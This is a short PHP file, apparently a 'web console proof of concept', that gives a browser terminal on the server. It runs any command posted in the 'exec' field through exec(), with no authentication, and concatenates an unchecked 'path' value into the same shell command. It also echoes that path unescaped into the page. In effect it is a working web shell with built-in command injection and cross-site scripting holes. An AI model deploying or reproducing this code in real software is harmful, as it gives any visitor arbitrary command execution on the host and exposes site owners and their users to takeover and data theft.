<?php

if(!isset($_POST['path'])) $_POST['path'] = "/";
if(isset($_POST['exec'])){
  exec("cd ".$_POST['path']." && ".$_POST['exec']." && pwd",$output);
  echo "client@webconsole:".$_POST['path']."$ ".$_POST['exec']."<br>";
  if(count($output) > 0){
    $last_of_array = count($output)-1;
    $_POST['path'] = $output[$last_of_array];
    unset($output[$last_of_array]);
  }
  
  $output = implode("\n",$output);
  echo "<pre>".htmlspecialchars($output)."</pre><br>";
  echo '<span class="input_line">client@webconsole:'.$_POST['path'].'$ <input class="exec_stuff" type="text"><input class="exec_dir" type="hidden" value="'.$_POST['path'].'"></span>';

}else{

?>

<html>
 <head>
  <title>Test Web console proof of concept</title>
  <script type="text/javascript" src="http://code.jquery.com/jquery-2.1.1.min.js"></script>
  <meta name="viewport" content="width=device-width, user-scalable=0" />
  <style>
    body {
      font-family: courier, Ubuntu, Arial;
      font-size: 13px;
      margin: 0;
    }
    pre {
      font-family: courier, Ubuntu, Arial;
    }

    .console_window {
      background-color: black;
      color: lightgreen;
      height:100%;
      width: 100%;
      margin:auto;
      position: relative;
      box-sizing: border-box;
      padding: 5px;
      overflow-y:scroll;
      overflow-x:hidden;
    }

    .console_window input {
      background-color: black;
      position: absolute;
      width: 75%;
      border:none;
      color: lightgreen;
      margin:1px;
      margin-left:5px;
      margin-top: -2px;
      font-family: courier, Ubuntu, Arial;
    }
    .console_window input:focus {
      outline: none;
    }
   
  </style>
 </head>
 <body>
  <div class="console_window" onclick="$('.console_window input').focus();">
    <span class="input_line">client@webconsole:<?=$_POST['path']?>$ <input class="exec_stuff" type="text"><input class="exec_dir" type="hidden" value="<?=$_POST['path']?>"></span>
  </div>
  <div id="cmd">
    <span></span>
    <div id="cursor"></div>
  </div>
  <script type="text/javascript">
    $(document).keypress(function(e) {
    if(e.which == 13) {
        $.post( "index.php", { exec: $(".exec_stuff").val(), path: $(".exec_dir").val() })
        .done(function( data ) {
          $(".input_line").remove();
          $(".console_window").append(data);
          $('.console_window input').focus();
          $(".console_window").animate({ scrollTop: $(".console_window").prop("scrollHeight")}, 200);
        });
      }
    });
  </script>
 </body>
</html>

<?php

}

?>